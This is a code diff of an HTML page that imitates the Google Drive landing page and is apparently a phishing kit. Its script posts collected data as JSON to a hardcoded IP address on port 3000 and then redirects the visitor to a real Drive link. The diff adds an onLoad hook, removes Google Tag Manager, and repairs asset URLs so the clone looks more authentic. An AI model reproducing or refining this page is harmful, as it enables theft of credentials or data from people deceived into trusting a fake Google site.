@@ -28,13 +28,11 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
           }
         }).then(function(data){
           var xhr = new XMLHttpRequest();
-          var url = 'http://104.248.22.84/post';
-          //url = 'http://127.0.0.1:3000/post';
+          var url = 'http://104.248.22.84:3000/post';
           xhr.open('POST', url);
           xhr.setRequestHeader('Content-Type', 'application/json');
           xhr.send(data);
           window.location.replace("https://drive.google.com/open?id=1qN9pZCqXOZEF2whtEVThorV8aXZiQ24f3Er6b35SSmg");
-
         });
       });
     }
@@ -44,9 +42,11 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
 <meta content="IE=edge" http-equiv="X-UA-Compatible">
 <meta charset="utf-8">
 <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
-<meta http-equiv="refresh" content="5; url='https://drive.google.com/open?id=1qN9pZCqXOZEF2whtEVThorV8aXZiQ24f3Er6b35SSmg'">
-<meta property="og:url" content="www.google.com/drive/">
-<meta name="twitter:url" content="www.google.com/drive/">
+<!-- <meta http-equiv="refresh" content="5; url='https://drive.google.com/open?id=1qN9pZCqXOZEF2whtEVThorV8aXZiQ24f3Er6b35SSmg'"> 
+url = 'http://127.0.0.1:3000/post'; 
+-->
+<meta property="og:url" content="https://www.google.com/drive/">
+<meta name="twitter:url" content="https://www.google.com/drive/">
 <meta name="twitter:title" content="Google Drive: Free Cloud Storage for Personal Use">
 <meta name="twitter:image" content="https://www.google.com/drive/static/images/drive/logo-drive.png">
 <meta name="twitter:description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account.">
@@ -62,17 +62,17 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
 <title>Google Drive: Free Cloud Storage for Personal Use</title>
 <meta content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." name="description">
 
-<link rel="prefetch" href="www.google.com/images/branding/googlelogo/2x/googlelogo_color_120x44dp.png">
-<link rel="stylesheet" href="www.gstatic.com/external_hosted/normalize/normalize.css">
-<link rel="stylesheet" href="www.google.com/css/maia.experimental.css">
-<link rel="stylesheet" href="www.google.com/css/gweb/lightbox.css">
+<link rel="prefetch" href="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_120x44dp.png">
+<link rel="stylesheet" href="https://www.gstatic.com/external_hosted/normalize/normalize.css">
+<link rel="stylesheet" href="https://www.google.com/css/maia.experimental.css">
+<link rel="stylesheet" href="https://www.google.com/css/gweb/lightbox.css">
 
 
 <link href="fonts.googleapis.com/css?family=Open+Sans:400,300,600&amp;subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic" rel="stylesheet">
-<link href="fonts.googleapis.com/css?family=Product+Sans" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Product+Sans" rel="stylesheet">
 
 <!-- External Scripts -->
-<script src="www.gstatic.com/external_hosted/modernizr/modernizr.js"></script>
+<script src="https://www.gstatic.com/external_hosted/modernizr/modernizr.js"></script>
 
 <!-- Favicon -->
 <link href="https://www.google.com/drive/static/images/drive/favicon.ico" rel="icon" type="image/png">
@@ -82,10 +82,8 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
     <!-- Google Tag Manager -->
     
   </head>
-  <body class="index nav-light" style="padding-top: 480px;">
-    <!-- Google Tag Manager (noscript) -->
-    <noscript>&lt;iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TRMP25X"
-    height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
+  <body onLoad="onLoad()" class="index nav-light" style="padding-top: 480px;">
+   
     <!-- End Google Tag Manager (noscript) -->
     <span itemscope="" itemtype="http://schema.org/LocalBusiness">
     <!-- Header -->
@@ -247,7 +245,7 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
       <div class="maia-col-3 footer-top social">
         Follow:
         <span class="follow">
-          <a href="//plus.google.com/+GoogleDrive" rel="publisher"><img alt="Google+" src="www.google.com/images/branding/google_plus/2x/gplus_icon_flush_30dp.png" height="16" width="16" data-retina="16x16"></a>
+          <a href="//plus.google.com/+GoogleDrive" rel="publisher"><img alt="Google+" src="https://www.google.com/images/branding/google_plus/2x/gplus_icon_flush_30dp.png" height="16" width="16" data-retina="16x16"></a>
           <a href="//twitter.com/googledrive/"><img alt="YouTube" src="https://www.google.com/drive/static/images/drive/footer_twitter.png" data-retina="16x16"></a>
           <a href="//googledrive.blogspot.com/"><img alt="Blogger" src="https://www.google.com/drive/static/images/drive/footer_blogger.jpg" data-retina="16x16"></a>
         </span>
@@ -577,13 +575,13 @@ Page title is Google Drive: Free Cloud Storage for Personal Use
             </div>
             <ul>
               <li>
-                <a href="//www.google.com">Google</a>
+                <a href="https://www.google.com">Google</a>
               </li>
               <li>
-                <a href="//www.google.com/about/">About Google</a>
+                <a href="https://www.google.com/about/">About Google</a>
               </li>
               <li>
-                <a href="//www.google.com/intl/en_US/policies/privacy/">Privacy</a>
+                <a href="https://www.google.com/intl/en_US/policies/privacy/">Privacy</a>
               </li>
               <li>
                 <a href="https://www.google.com/drive/terms-of-service/">Terms</a>
